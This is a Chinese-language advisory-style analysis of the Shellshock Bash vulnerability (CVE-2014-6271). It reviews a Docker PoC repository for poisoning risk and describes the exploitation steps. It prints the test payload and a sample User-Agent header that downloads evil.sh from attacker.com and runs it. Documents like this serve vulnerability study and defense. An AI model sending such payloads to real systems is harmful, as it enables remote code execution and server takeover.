## CVE-2014-6271-Shellshock

**漏洞编号:** CVE-2014-6271

**漏洞类型:** 远程代码执行

**影响应用:** GNU Bash

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** <= 4.3

**利用条件:** 目标系统使用存在漏洞的Bash版本，并且通过CGI或其他方式允许环境变量注入。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2014-6271，又名Shellshock，是一个存在于 GNU Bash 中的严重漏洞。该漏洞允许攻击者通过特制的包含函数定义的字符串，在环境变量中注入并执行任意代码。

**有效性：**
提供的 Dockerfile 和相关 CGI 脚本构成了一个有效的 PoC 环境。Dockerfile 设置了一个基于 `vulhub/bash:4.3.0-with-httpd` 镜像的容器，该镜像包含一个易受攻击的 Bash 版本和一个 HTTP 服务器。`victim.cgi` 脚本旨在通过 CGI 执行 Bash 代码，但脚本本身的代码是无害的。漏洞利用的关键在于攻击者如何构造 HTTP 请求，将恶意代码注入到传递给 `victim.cgi` 脚本的环境变量中。如果服务器配置允许，则可以远程利用此漏洞执行任意命令。

**投毒风险：**
在提供的代码片段中，直接的代码投毒风险较低（约为 10%），主要原因是:
* `safe.cgi` 和 `victim.cgi` 文件中的 bash 代码非常简单，只输出“Hello world”，功能正常。没有发现任何恶意代码。  
*  Dockerfile指令中的 `RUN chmod +x /var/www/html/safe.cgi` 和 `RUN chmod +x /var/www/html/victim.cgi` 功能正常，没有发现任何恶意代码。

但是，需要注意以下几点潜在风险：
* **基础镜像风险：** PoC 依赖于 `vulhub/bash:4.3.0-with-httpd` 镜像。虽然该镜像旨在提供一个易受攻击的环境，但仍然需要确保该镜像本身没有被篡改或包含恶意代码。评估基础镜像的来源和可信度至关重要。
* **服务器配置风险：** 漏洞的利用依赖于 Web 服务器（如 Apache）如何处理 CGI 请求以及环境变量。如果服务器配置不当，可能会进一步加剧漏洞的风险。例如，某些配置可能允许攻击者覆盖更多的环境变量，从而扩大攻击面。
* **供应链攻击风险：** 攻击者可能通过污染开发者的环境或者代码仓库来插入恶意代码。

总体来说，直接代码投毒的风险较低，但基础镜像和服务器配置的安全性仍然需要谨慎评估。

**利用方式：**
1.  **目标环境：** 目标系统需要运行一个存在漏洞的 Bash 版本（<= 4.3）。
2.  **攻击入口：** 攻击通常通过 CGI 脚本或其他接受环境变量的 Web 应用入口进行。
3.  **注入恶意代码：** 攻击者构造一个包含恶意代码的环境变量。典型的 Shellshock payload 如下：`() { :; }; echo vulnerable`。这个 payload 利用了 Bash 在处理函数定义后剩余字符串的方式，`echo vulnerable` 会被执行。
4.  **触发漏洞：** 当 Bash 执行 CGI 脚本或处理包含恶意环境变量的请求时，漏洞被触发，攻击者注入的代码被执行。
5.  **远程代码执行：** 一旦漏洞被触发，攻击者就可以在目标系统上执行任意命令，例如获取敏感信息、修改系统配置或安装恶意软件。

**举例说明：**
攻击者可以构造一个 HTTP 请求头，例如 `User-Agent: () { :; }; /usr/bin/wget http://attacker.com/evil.sh -O /tmp/evil.sh; sh /tmp/evil.sh`。当 Web 服务器调用 Bash 处理该请求时，`wget` 命令会被执行，从 `attacker.com` 下载恶意脚本并在目标系统上执行。

**项目地址:** [anujbhan/shellshock-victim-host](https://github.com/anujbhan/shellshock-victim-host)

**漏洞详情:** [CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)